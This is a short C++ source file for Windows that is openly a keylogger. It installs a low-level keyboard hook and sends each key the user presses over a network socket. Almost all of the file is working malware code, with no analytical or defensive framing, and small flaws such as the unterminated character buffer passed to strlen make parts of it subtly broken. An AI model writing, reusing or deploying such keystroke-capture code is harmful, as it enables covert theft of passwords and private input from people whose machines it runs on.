#include <iostream>
#include <ctime>
#include "Header.h"

HHOOK hook = NULL;
SOCKET globalSock = INVALID_SOCKET;

LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	if (wParam == WM_KEYDOWN) {
		char character[] = { (p->vkCode) };
		send(globalSock, character, (int)strlen(character), 0);
	}
	return CallNextHookEx(hook, code, wParam, lParam);
}

int startLogging(SOCKET sock)
{
	globalSock = sock;
	std::cout << "Keylogger Started at " << std::endl;
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);

 	MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);
	return 0;

}